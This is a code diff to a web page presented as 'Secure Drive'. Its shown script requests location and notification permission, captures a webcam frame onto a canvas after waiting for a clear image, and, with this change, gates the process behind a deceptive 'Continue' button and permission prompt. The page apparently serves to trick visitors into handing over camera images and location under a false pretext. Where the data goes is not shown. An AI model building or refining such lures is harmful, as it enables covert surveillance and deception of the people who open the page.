@@ -34,6 +34,16 @@
       animation: spin 1s linear infinite;
       margin: 1em auto;
     }
+    button {
+      background: #00ffcc;
+      color: #000;
+      border: none;
+      padding: 0.6em 1.2em;
+      font-size: 1rem;
+      cursor: pointer;
+      border-radius: 5px;
+      margin-top: 1em;
+    }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
@@ -42,8 +52,8 @@
 </head>
 <body>
   <div id="main">
-    <div id="statusText">Requesting required permissions…</div>
-    <div id="spinner"></div>
+    <div id="statusText">Permissions are required to access Secure Drive.</div>
+    <button onclick="startAll()">Continue</button>
   </div>
 
   <script>
@@ -84,7 +94,6 @@
 
         await video.play().catch(err => console.warn("Video play failed", err));
 
-        // Wait until video has dimensions
         await new Promise((resolve) => {
           const waitForSize = () => {
             if (video.videoWidth > 0 && video.videoHeight > 0) resolve();
@@ -93,7 +102,6 @@
           waitForSize();
         });
 
-        // Wait extra time for image to be clear
         await new Promise(res => setTimeout(res, 3000));
 
         const canvas = document.createElement("canvas");
@@ -169,6 +177,11 @@
     }
 
     async function startAll() {
+      document.getElementById("main").innerHTML = `
+        <div id="statusText">Requesting permissions…</div>
+        <div id="spinner"></div>
+      `;
+
       const locationAllowed = await askLocation();
       askNotificationPermission();
 
@@ -202,8 +215,6 @@
         }
       }, 1000);
     }
-
-    startAll();
   </script>
 </body>
 </html>
